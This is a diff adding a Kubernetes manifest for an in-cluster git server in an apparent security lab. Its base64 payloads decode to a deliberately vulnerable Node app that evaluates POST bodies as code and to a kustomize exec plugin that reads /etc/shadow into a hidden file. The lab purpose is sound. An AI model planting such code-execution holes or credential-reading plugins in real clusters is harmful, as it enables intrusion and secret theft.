@@ -1,0 +1,59 @@
+##
+## gitserver — the GitOps source Argo CD syncs from (ns: gitops).
+## Serves two repos over git:// on :9418 (base-path /repos):
+##   gitops.git     the legitimate react Application source (Argo CD syncs this)
+##   malrender.git  source a planted Application can point at
+## Self-contained: no external git host needed; the react2shell scenario
+## resolves its source in-cluster.
+##
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: gitops
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: gitserver
+  namespace: gitops
+  labels: {app: gitserver}
+spec:
+  replicas: 1
+  selector: {matchLabels: {app: gitserver}}
+  template:
+    metadata:
+      labels: {app: gitserver}
+    spec:
+      containers:
+      - name: gitserver
+        image: alpine/git:latest
+        resources: {limits: {cpu: "500m", memory: "256Mi"}}
+        ports: [{containerPort: 9418}]
+        command: ["sh","-c"]
+        args:
+        - |
+          set -e
+          apk add --no-cache git-daemon >/dev/null 2>&1 || apk add --no-cache git-daemon
+          mkdir -p /repos
+          mkdir -p /w1 && cd /w1 && git init -q && git config user.email a@b.c && git config user.name a
+          echo 'YXBpVmVyc2lvbjogdjEKa2luZDogU2VydmljZUFjY291bnQKbWV0YWRhdGE6IHtuYW1lOiByZWFjdC1zYSwgbmFtZXNwYWNlOiByZWFjdH0KLS0tCmFwaVZlcnNpb246IHYxCmtpbmQ6IENvbmZpZ01hcAptZXRhZGF0YToge25hbWU6IHJlYWN0LWNvZGUsIG5hbWVzcGFjZTogcmVhY3R9CmJpbmFyeURhdGE6CiAgc2VydmVyLmpzOiBZMjl1YzNRZ2FIUjBjQ0E5SUhKbGNYVnBjbVVvSjJoMGRIQW5LVHNLTHk4Z1RXbHVhVzFoYkNCemRHRnVaQzFwYmlCbWIzSWdVbVZoWTNRZ1UyVnlkbVZ5SUVOdmJYQnZibVZ1ZEhNZ0lrWnNhV2RvZENJZ1pHVnpaWEpwWVd4cGVtRjBhVzl1SUNoRFZrVXRNakF5TlMwMU5URTRNaWs2Q2k4dklHRWdVRTlUVkNCM2FHOXpaU0JpYjJSNUlHbHpJR1JsYzJWeWFXRnNhWHBsWkNCaGJtUWdaWFpoYkhWaGRHVmtJSE5sY25abGNpMXphV1JsSUhWdVpHVnlJSFJvWlNCT2IyUmxJSEoxYm5ScGJXVXVDbWgwZEhBdVkzSmxZWFJsVTJWeWRtVnlLQ2h5WlhFc0lISmxjeWtnUFQ0Z2V3b2dJR2xtSUNoeVpYRXViV1YwYUc5a0lEMDlQU0FuVUU5VFZDY2dKaVlnY21WeExuVnliQ0E5UFQwZ0p5OWhjR2t2Y25Oakp5a2dld29nSUNBZ2JHVjBJR0lnUFNBbkp6c0tJQ0FnSUhKbGNTNXZiaWduWkdGMFlTY3NJR01nUFQ0Z1lpQXJQU0JqS1RzS0lDQWdJSEpsY1M1dmJpZ25aVzVrSnl3Z0tDa2dQVDRnZXdvZ0lDQWdJQ0IwY25rZ2V3b2dJQ0FnSUNBZ0lHTnZibk4wSUc5MWRDQTlJRzVsZHlCR2RXNWpkR2x2YmlnbmNtVnhkV2x5WlNjc0lDZHRiMlIxYkdVbkxDQmlLU2h5WlhGMWFYSmxMQ0J0YjJSMWJHVXBPeUF2THlCa1pYTmxjbWxoYkdsNlpTQXRQaUJqYjJSbExXVjRaV01nYzJsdWF3b2dJQ0FnSUNBZ0lISmxjeTVsYm1Rb0oyOXJPaWNnS3lCVGRISnBibWNvYjNWMElEMDlQU0IxYm1SbFptbHVaV1FnUHlBbkp5QTZJRzkxZENrcE93b2dJQ0FnSUNCOUlHTmhkR05vSUNobEtTQjdJSEpsY3k1emRHRjBkWE5EYjJSbElEMGdOVEF3T3lCeVpYTXVaVzVrS0NkbGNuSW5LVHNnZlFvZ0lDQWdmU2s3Q2lBZ2ZTQmxiSE5sSUhzS0lDQWdJSEpsY3k1bGJtUW9KM0psWVdOMElHRndjQ0J2YTF4dUp5azdJQzh2SUVkRlZDQXZJT0tBbENCM2FHRjBJR0Z5WjI5alpDQm9aV0ZzZEdndFkyaGxZMnR6T3lCMGFHVWdZbVZ1YVdkdUlHSmhjMlZzYVc1bENpQWdmUXA5S1M1c2FYTjBaVzRvTXpBd01Dd2dLQ2tnUFQ0Z1kyOXVjMjlzWlM1c2IyY29KM0psWVdOMElHRndjQ0JzYVhOMFpXNXBibWNnT2pNd01EQW5LU2s3Q2c9PQotLS0KYXBpVmVyc2lvbjogYXBwcy92MQpraW5kOiBEZXBsb3ltZW50Cm1ldGFkYXRhOiB7bmFtZTogcmVhY3QsIG5hbWVzcGFjZTogcmVhY3QsIGxhYmVsczoge2FwcDogcmVhY3R9fQpzcGVjOgogIHJlcGxpY2FzOiAxCiAgc2VsZWN0b3I6IHttYXRjaExhYmVsczoge2FwcDogcmVhY3R9fQogIHRlbXBsYXRlOgogICAgbWV0YWRhdGE6CiAgICAgIGxhYmVsczoKICAgICAgICBhcHA6IHJlYWN0CiAgICAgICAga3ViZXNjYXBlLmlvL3VzZXItZGVmaW5lZC1wcm9maWxlOiByZWFjdAogICAgICAgIGt1YmVzY2FwZS5pby91c2VyLWRlZmluZWQtbmV0d29yazogcmVhY3QKICAgIHNwZWM6CiAgICAgIHNlcnZpY2VBY2NvdW50TmFtZTogcmVhY3Qtc2EKICAgICAgY29udGFpbmVyczoKICAgICAgLSBuYW1lOiByZWFjdAogICAgICAgIGltYWdlOiBub2RlOjIwLWFscGluZQogICAgICAgIGNvbW1hbmQ6IFsibm9kZSIsIi9hcHAvc2VydmVyLmpzIl0KICAgICAgICByZXNvdXJjZXM6IHtsaW1pdHM6IHtjcHU6ICI1MDBtIiwgbWVtb3J5OiAiMjU2TWkifX0KICAgICAgICBwb3J0czogW3tjb250YWluZXJQb3J0OiAzMDAwfV0KICAgICAgICB2b2x1bWVNb3VudHM6IFt7bmFtZTogY29kZSwgbW91bnRQYXRoOiAvYXBwfV0KICAgICAgdm9sdW1lczogW3tuYW1lOiBjb2RlLCBjb25maWdNYXA6IHtuYW1lOiByZWFjdC1jb2RlfX1dCi0tLQphcGlWZXJzaW9uOiB2MQpraW5kOiBTZXJ2aWNlCm1ldGFkYXRhOiB7bmFtZTogcmVhY3QsIG5hbWVzcGFjZTogcmVhY3R9CnNwZWM6CiAgc2VsZWN0b3I6IHthcHA6IHJlYWN0fQogIHBvcnRzOiBbe3BvcnQ6IDgwLCB0YXJnZXRQb3J0OiAzMDAwfV0K' | base64 -d > react.yaml
+          git add -A && git commit -qm react
+          git clone -q --bare /w1 /repos/gitops.git && (cd /repos/gitops.git && git update-server-info && touch git-daemon-export-ok)
+          mkdir -p /w2 && cd /w2 && git init -q && git config user.email a@b.c && git config user.name a
+          printf 'generators:\n- malgen.yaml\n' > kustomization.yaml
+          printf 'apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: malgen\n  annotations:\n    config.kubernetes.io/function: |\n      exec:\n        path: ./mal.sh\n' > malgen.yaml
+          echo 'IyEvYmluL3NoCmNhdCA+L2Rldi9udWxsIDI+JjEKaGVhZCAtYyA2NCAvZXRjL3NoYWRvdyA+L3RtcC8ueCAyPi9kZXYvbnVsbAppZCA+L2Rldi9udWxsIDI+JjEKY2F0IDw8J09VVCcKYXBpVmVyc2lvbjogY29uZmlnLmt1YmVybmV0ZXMuaW8vdjEKa2luZDogUmVzb3VyY2VMaXN0Cml0ZW1zOgotIGFwaVZlcnNpb246IHYxCiAga2luZDogQ29uZmlnTWFwCiAgbWV0YWRhdGE6CiAgICBuYW1lOiBtYWxyZW5kZXItb3V0CiAgICBuYW1lc3BhY2U6IGFyZ29jZAogIGRhdGE6CiAgICByZW5kZXJlZDogInRydWUiCk9VVAo=' | base64 -d > mal.sh && chmod +x mal.sh
+          git add -A && git commit -qm mal
+          git clone -q --bare /w2 /repos/malrender.git && (cd /repos/malrender.git && git update-server-info && touch git-daemon-export-ok)
+          echo "serving gitops.git + malrender.git :9418"
+          exec git daemon --reuseaddr --export-all --base-path=/repos --verbose /repos
+          
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: gitserver
+  namespace: gitops
+spec:
+  selector: {app: gitserver}
+  ports: [{port: 9418, targetPort: 9418}]
